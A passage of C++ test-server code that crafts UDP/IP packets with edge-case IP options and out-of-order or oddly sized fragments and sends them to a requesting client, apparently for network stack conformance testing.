	pIPPacket ? delete pIPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPOptionsExactSizeServ
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a variable-length option reaching the exact end of the header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsExactSizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16], PayloadData[1], *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	// Watch for SPARTA exceptions
	try
	{
		// Hard-code the address for now.  We'll work something better out later.
		MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szClientMacAddr);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(szClientIPAddr);
		pUDPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE + 1);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_NO_OPERATION);
		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(3 + sizeof(DWORD));
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, szClientIPAddr);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
		pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);

		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pSessionInfo->pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPOptionsEndOfOpsLastServ
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a variable-length option followed by an end-of-options
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsEndOfOpsLastServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16], PayloadData[1], *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	// Watch for SPARTA exceptions
	try
	{
		// Hard-code the address for now.  We'll work something better out later.
		MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szClientMacAddr);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(szClientIPAddr);
		pUDPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE + 1);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(3 + sizeof(DWORD));
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, szClientIPAddr);
		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_END_OF_OPTIONLIST);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
		pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);
		
		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pSessionInfo->pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPOptionsEndOfOpsFirstServ
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with an end-of-options followed by a variable-length option
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsEndOfOpsFirstServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16], PayloadData[1], *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	// Watch for SPARTA exceptions
	try
	{
		// Hard-code the address for now.  We'll work something better out later.
		MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szClientMacAddr);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(szClientIPAddr);
		pUDPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_END_OF_OPTIONLIST);
		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(3 + sizeof(DWORD));
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, szClientIPAddr);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
		pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);
		
		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pSessionInfo->pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPFragFullReverseServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram in reverse order
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragFullReverseServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[16];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = (DEFAULT_FRAG_COUNT - 1); i >= 0; --i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == (DEFAULT_FRAG_COUNT - 1)) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset( i * 2);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMidReverseServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the
// middle two fragments are in reverse order
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMidReverseServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[16];

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			pIPPacket->IPHeader.SetFlag((i == DEFAULT_FRAG_COUNT - 1) ? 0 : IPFLAG_MOREFRAGS);

			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(2 * 2);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(1 * 2);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(3 * 2);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				break;
			}
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);
			
			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragLastInSecondServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the
// the last fragment arrives second
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragLastInSecondServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[16];

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);


			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(3 * 2);
				pIPPacket->IPHeader.SetFlag(0);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(1 * 2);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(2 * 2);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				break;
			}
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);
			
			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMixedSizeServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the fragments
// are of varying sizes.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMixedSizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[32];

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
